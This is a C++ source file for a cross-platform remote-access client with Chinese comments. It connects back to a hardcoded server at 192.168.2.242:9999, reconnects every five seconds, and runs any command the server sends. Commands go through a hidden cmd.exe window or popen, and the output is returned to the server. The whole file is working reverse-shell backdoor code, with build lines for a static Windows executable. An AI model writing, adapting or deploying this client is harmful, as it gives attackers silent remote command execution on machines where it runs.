// g++ -std=c++17 c_agent.cpp -o client
// mingw: x86_64-w64-mingw32-g++ -std=c++17 c_agent.cpp -o client.exe -lws2_32 -static

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <mutex>

#include "json.hpp"
using json = nlohmann::json;

#ifdef _WIN32
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <direct.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <arpa/inet.h>
#endif

#define SERVER_IP "192.168.2.242"
#define SERVER_PORT 9999

// ================= 全局锁 =================
std::mutex send_mutex;

// ================= UTF8 =================

#ifdef _WIN32
std::string gbk_to_utf8(const std::string& gbk) {
    int wlen = MultiByteToWideChar(CP_ACP, 0, gbk.c_str(), -1, NULL, 0);
    if (wlen <= 0) return gbk;

    std::wstring wbuf(wlen, 0);
    MultiByteToWideChar(CP_ACP, 0, gbk.c_str(), -1, &wbuf[0], wlen);

    int u8len = WideCharToMultiByte(CP_UTF8, 0, wbuf.c_str(), -1, NULL, 0, NULL, NULL);
    if (u8len <= 0) return gbk;

    std::string utf8(u8len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wbuf.c_str(), -1, &utf8[0], u8len, NULL, NULL);

    return utf8;
}
#endif

std::string safe_utf8(const std::string& s) {
    std::string out;
    for (unsigned char c : s) {
        if (c < 0x80) out += c;
        else out += '?';
    }
    return out;
}

std::string normalize(const std::string& s) {
#ifdef _WIN32
    return safe_utf8(gbk_to_utf8(s));
#else
    return s;
#endif
}

// ================= SOCKET =================

void init_socket() {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
#endif
}

void close_socket(int sock) {
#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif
}

// ================= 网络 =================

bool send_packet(int sock, const json& j) {
    std::string body = j.dump(-1, ' ', false, json::error_handler_t::replace);

    uint32_t len = body.size();
    char header[4] = {
        (char)(len & 0xFF),
        (char)((len >> 8) & 0xFF),
        (char)((len >> 16) & 0xFF),
        (char)((len >> 24) & 0xFF)
    };

    std::lock_guard<std::mutex> lock(send_mutex);

    if (send(sock, header, 4, 0) != 4) return false;
    if (send(sock, body.c_str(), body.size(), 0) != (int)body.size()) return false;
    return true;
}

bool recv_all(int sock, char* buf, int len) {
    int rec = 0;
    while (rec < len) {
        int r = recv(sock, buf + rec, len - rec, 0);
        if (r <= 0) return false;
        rec += r;
    }
    return true;
}

bool recv_packet(int sock, json& out) {
    char header[4];
    if (!recv_all(sock, header, 4)) return false;

    uint32_t len =
        (unsigned char)header[0] |
        ((unsigned char)header[1] << 8) |
        ((unsigned char)header[2] << 16) |
        ((unsigned char)header[3] << 24);

    std::vector<char> body(len);
    if (!recv_all(sock, body.data(), len)) return false;

    out = json::parse(body, nullptr, false);
    return !out.is_discarded();
}

// ================= 执行命令（关键修复） =================

#ifdef _WIN32
std::string exec_cmd(const std::string& cmd, const std::string& cwd) {
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa{ sizeof(sa), NULL, TRUE };

    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return "pipe failed";

    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    std::string full = "cmd.exe /c chcp 65001>nul && cd /d \"" + cwd + "\" && " + cmd + " 2>&1";

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    if (!CreateProcessA(NULL, (LPSTR)full.c_str(), NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return "CreateProcess failed";
    }

    CloseHandle(hWrite);

    std::string result;
    char buffer[4096];
    DWORD bytesRead;

    while (true) {
        BOOL ok = ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL);
        if (!ok || bytesRead == 0) break;
        result.append(buffer, bytesRead);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    return normalize(result);
}
#else
std::string exec_cmd(const std::string& cmd, const std::string& cwd) {
    std::string result;
    char buffer[256];

    std::string full = "cd \"" + cwd + "\" && " + cmd + " 2>&1";
    FILE* pipe = popen(full.c_str(), "r");

    if (!pipe) return "exec failed";

    while (fgets(buffer, sizeof(buffer), pipe)) {
        result += buffer;
    }

    pclose(pipe);
    return result;
}
#endif

// ================= SESSION =================

struct Session {
    int sock;
    std::string cwd;
};

// ================= 主逻辑 =================

void handle_command(Session session, int id, std::string text) {
    std::string result = exec_cmd(text, session.cwd);

    json resp = {
        {"type","result"},
        {"id",id},
        {"status",1},
        {"text",result},
        {"cwd",session.cwd},
        {"eof",1}
    };

    send_packet(session.sock, resp);
}

void run_client() {
    init_socket();

    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);

#ifdef _WIN32
        server.sin_addr.s_addr = inet_addr(SERVER_IP);
#else
        inet_pton(AF_INET, SERVER_IP, &server.sin_addr);
#endif

        if (connect(sock, (sockaddr*)&server, sizeof(server)) < 0) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        Session session{ sock, "." };

        json info = {
            {"type","info"},
            {"id","cpp-client"},
            {"cwd",session.cwd}
        };

        send_packet(sock, info);

        while (true) {
            json msg;

            if (!recv_packet(sock, msg)) {
                close_socket(sock);
                break;
            }

            std::string type = msg.value("type", "");

            if (type == "command") {
                int id = msg["id"];
                std::string text = msg.value("text", "");

                std::thread(handle_command, session, id, text).detach();
            }
        }
    }
}

int main() {
    run_client();
    return 0;
}